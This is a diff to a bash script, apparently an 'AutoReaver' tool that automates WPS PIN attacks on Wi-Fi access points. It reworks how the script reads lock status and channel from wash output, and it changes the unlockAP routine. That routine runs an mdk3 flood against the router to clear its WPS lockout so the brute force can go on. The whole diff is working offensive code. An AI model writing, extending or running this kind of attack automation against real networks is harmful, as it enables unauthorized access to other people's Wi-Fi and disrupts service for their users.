@@ -341,7 +341,36 @@ reaverConfig(){
 	local REAVER_OUTPUT;
 }
 
-checkLockStatus(){
+setAPStatus(){
+	local CHECK_LOCK_STATUS;
+
+	CHECK_LOCK_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.LockStatus';
+
+	if [[ -f $CHECK_LOCK_STATUS ]]; then
+		if [[ "$(cat $CHECK_LOCK_STATUS | awk --field-separator='_' '{ print $5 }')" != "$AP_CHANNEL" && "$(cat $CHECK_LOCK_STATUS | awk --field-separator='_' '{ print $4 }')" != "NOT-FOUND" ]]; then
+			AP_CHANNEL="$(cat $CHECK_LOCK_STATUS | awk --field-separator='_' '{ print $5 }')";
+			echoBlue "AP Channel Changed To $AP_CHANNEL......";
+		fi
+
+	        case "$(cat $CHECK_LOCK_STATUS | awk --field-separator='_' '{ print $4 }')" in
+	                "LOCKED")
+	                        AP_LOCK="Yes";
+	                        echoRed "AP Is Locked......";;
+	                "UNLOCKED")
+	                        AP_LOCK="No";
+	                        echoGreen "AP Is Not Locked......";;
+	                "NOT-FOUND")
+	                        AP_LOCK="";
+	                        echoOrange "AP Not Found......";;
+	        esac
+
+		$(rm $CHECK_LOCK_STATUS);
+	else
+		echoRed "Check Lock Status File Missing......";
+	fi
+}
+
+checkAPStatus(){
 	local CMD_LOCK_STATUS;
 	local WASH_OUTPUT;
 	local CHECK_LOCK_STATUS;
@@ -354,54 +383,40 @@ checkLockStatus(){
 	fi
 
 	CHECK_LOCK_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.LockStatus';
-	touch $CHECK_LOCK_STATUS;
+
+	if [[ ! -f $CHECK_LOCK_STATUS ]]; then
+		touch $CHECK_LOCK_STATUS;
+	fi
 
 	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
 	eval $CMD_LOCK_STATUS | {
 		while read -r WASH_OUTPUT; do
+
 			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") -eq 1 ]]; then
 
 				if [[ "$(awk '{ print $5 }' <<< $WASH_OUTPUT)" == "Yes" ]]; then
-					echo "AP_CHECK_STATUS_LOCKED" > $CHECK_LOCK_STATUS;
+					echo "AP_CHECK_STATUS_LOCKED_$(awk '{ print $2 }' <<< $WASH_OUTPUT)" > $CHECK_LOCK_STATUS;
 				else
-					echo "AP_CHECK_STATUS_UNLOCKED" > $CHECK_LOCK_STATUS;
-				fi
-
-				if [[ "$(awk '{ print $2 }' <<< $WASH_OUTPUT)" != "$AP_CHANNEL" ]]; then
-					echoBlue "AP Channel Changed To $(awk '{ print $2 }' <<< $WASH_OUTPUT)......";
-					AP_CHANNEL="$(awk '{ print $2 }' <<< $WASH_OUTPUT)";
+					echo "AP_CHECK_STATUS_UNLOCKED_$(awk '{ print $2 }' <<< $WASH_OUTPUT)" > $CHECK_LOCK_STATUS;
 				fi
 
 				break;
 			else
-				echo "AP_NOT_FOUND" > $CHECK_LOCK_STATUS;
+				WASH_ATTEMPT=$((WASH_ATTEMPT+1));
+				echo "AP_CHECK_STATUS_NOT-FOUND_$WASH_ATTEMPT" > $CHECK_LOCK_STATUS;
+
+                                if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
+                                        checkAPStatus;
+                                fi
 			fi
 		done
-
-		echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_LOCK_STATUS)") >> $STATUS_FILE;
 	}
 
-	case $(cat $CHECK_LOCK_STATUS) in
-		["AP_CHECK_STATUS_LOCKED"]* )
-			AP_LOCK="Yes";
-			echoRed "AP Is Locked......";;
-		["AP_CHECK_STATUS_UNLOCKED"]* )
-			AP_LOCK="No";
-			echoGreen "AP Is Not Locked......";;
-		["AP_NOT_FOUND"]* )
-			WASH_ATTEMPT=$((WASH_ATTEMPT+1));
-			AP_LOCK="";
-			echoOrange "AP Not Found......";
+	if [[ "$(awk 'END {print $3}' $STATUS_FILE | grep -ic 'MDK3_FLOOD_ATTACK')" -eq 0 ]]; then
+		setAPStatus;
+	fi
 
-			if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
-				$(rm $CHECK_LOCK_STATUS);
-				AP_LOCK="";
-				checkLockStatus;
-			fi
-			;;
-	esac
-
-	$(rm $CHECK_LOCK_STATUS);
+	echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_LOCK_STATUS)") >> $STATUS_FILE;
 }
 
 unlockAP(){
@@ -442,16 +457,18 @@ unlockAP(){
 		while read -r MDK3_OUTPUT; do
 			if [[ $(echo "$MDK3_OUTPUT" | grep -ic "Device is still responding with") -eq 1 ]]; then
 				CLIENT_COUNT=$(echo "$MDK3_OUTPUT" | awk '{ print $6 }');
-				echo -ne "\r $CLIENT_COUNT Clients Connected! ";
+				echo -ne "\r $CLIENT_COUNT Clients Connected! \r";
+				echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$(echo $LOOP_TARGET | cut -d, -f$COUNT)") >> $STATUS_FILE;
 
 				if [[ $COUNT -le $(echo $LOOP_TARGET | awk --field-separator="," "{ print NF }") ]]; then
 					if [[ $CLIENT_COUNT -eq $(echo $LOOP_TARGET | cut -d, -f$COUNT) ]]; then
-						COUNT=$(($COUNT+1));
-						checkLockStatus;
+						checkAPStatus;
 
 						if [[ "$AP_LOCK" == "No" ]]; then
 							break;
 						fi
+
+						COUNT=$(($COUNT+1));
 					fi
 				else
 					break;
@@ -462,7 +479,7 @@ unlockAP(){
 		$(killall -I mdk3);
 	}
 
-	echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$MAX_CLIENTS") >> $STATUS_FILE
+	setAPStatus;
 }
 
 getRandomMac(){
@@ -637,6 +654,8 @@ checkRequisites(){
 }
 
 exitAutoReaver(){
+	echoBlue "Exiting AutoReaver......";
+
 	local netManagerStatus;
 
         if [ -z "$WIFI_CARD_MONITOR" ]; then
@@ -815,7 +834,7 @@ while true; do
 			fi
 		else
 
-			checkLockStatus;
+			checkAPStatus;
 
 			if [[ "$AP_LOCK" == "Yes" ]]; then
 				unlockAP;
